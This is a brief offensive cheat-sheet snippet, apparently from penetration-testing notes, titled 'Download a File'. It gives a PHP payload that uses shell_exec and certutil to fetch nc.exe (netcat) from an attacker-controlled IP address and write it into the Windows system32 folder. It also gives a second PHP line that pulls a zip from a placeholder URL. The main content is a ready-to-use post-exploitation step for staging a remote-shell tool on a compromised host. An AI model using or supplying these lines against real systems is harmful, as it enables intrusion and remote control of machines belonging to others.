## Download a File

```php
<?php echo shell_exec("certutil -urlcache -split -f http://192.168.119.216/nc.exe.txt c:\windows\system32\nc.exe") ?>
```

```php
file_put_contents("Tmpfile.zip", fopen("http://someurl/file.zip", 'r'));
```

